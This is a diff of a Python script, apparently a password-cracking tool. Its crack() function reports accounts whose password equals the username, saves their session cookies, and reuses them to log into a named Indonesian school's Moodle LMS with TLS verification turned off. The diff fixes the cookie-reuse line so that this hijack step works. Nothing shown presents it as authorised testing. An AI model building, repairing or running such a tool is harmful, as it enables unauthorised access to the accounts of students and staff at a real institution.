@@ -6,7 +6,6 @@ import re,os,json
 from bs4 import BeautifulSoup
 import urllib3
 import certifi
-from concurrent.futures import ThreadPoolExecutor as tred
 
 # -------------[ IMPORT TO RICH ]------------- #
 
@@ -14,8 +13,7 @@ from rich import print as prints
 from rich.panel import Panel
 from rich.table import Table as me
 from rich.tree import Tree
-from rich.columns import Columns as col, Columns
-from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
+from rich.columns import Columns as Columns
 from rich.console import Console as sol,Console
 
 # -------------[ IMPORT TO SELENIUM ]------------- #
@@ -26,7 +24,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-# -------------[ BLOCK TO LIB DISMISS ]------------- #
+# -------------[ BLOCK TO LIB CERTIFI ]------------- #
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
@@ -630,7 +628,7 @@ def crack():
                 Meledak.add(Panel.fit(f"[bold green]Username: {idf}, Password: {idf}"))
                 Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
                 try:
-                    session.cookies.update({key: value for key, value in (item.split('=') for item in cookie.split('; '))})
+                    session.cookies.update({key: value for key, value in (item.split('=') for item in cookies.split('; '))})
                     url = "https://lms.smkn4padalarang.sch.id/my/"
                     response = session.get(url, verify=False)
                     soup = BeautifulSoup(response.text, 'html.parser')
